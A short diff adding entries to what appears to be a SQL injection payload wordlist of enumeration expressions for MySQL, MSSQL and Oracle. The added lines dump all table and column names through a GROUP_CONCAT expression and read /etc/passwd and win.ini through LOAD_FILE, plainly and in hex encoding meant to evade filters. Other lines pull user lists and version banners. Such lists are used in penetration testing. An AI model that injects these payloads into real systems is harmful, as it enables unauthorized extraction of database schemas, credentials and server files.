@@ -4,6 +4,13 @@ name from master..syslogins
 table_name+':'+column_name+':'+data_type from information_schema.columns
 user()
 user from mysql.user
+MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
+LOAD_FILE('/etc/passwd')
+LOAD_FILE('/windows/win.ini')
+LOAD_FILE(0x2F6574632F706173737764)
+LOAD_FILE(0x2f77696e646f77732f77696e2e696e69)
 user from dual
 banner from v$version
 username from all_users
+table_name FROM all_tables
+column_name FROM all_tab_columns
